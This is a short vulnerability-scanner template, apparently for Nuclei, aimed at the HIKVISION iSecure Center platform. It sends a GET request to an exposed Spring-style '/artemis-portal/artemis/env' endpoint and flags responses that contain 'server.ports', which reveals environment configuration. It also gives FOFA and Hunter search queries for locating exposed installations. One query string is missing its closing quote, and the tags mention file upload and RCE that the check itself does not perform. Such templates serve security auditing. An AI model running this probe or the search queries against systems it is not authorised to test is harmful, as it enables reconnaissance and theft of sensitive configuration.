id: HIKVISION-iSecure-Center-read-env
info:
  name: HIKVISION-iSecure-Center-read-env
  author: hufei
  severity: high
  description: |
    HIKVISION 综合安防管理平台存在信息泄漏漏洞，攻击者通过漏洞可以获取环境env等敏感消息进一步攻击
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  metadata:
    max-request: 2
    fofa-query: app="HIKVISION-综合安防管理平台"
    hunter-query: web.title=="综合安防管理平台
  tags: HIKVISION-iSecure-Center,fileupload,rce,intrusive

requests:
  - method: GET
    path:
      - "{{BaseURL}}/artemis-portal/artemis/env "
    matchers:
      - type: word
        words:
          - "server.ports"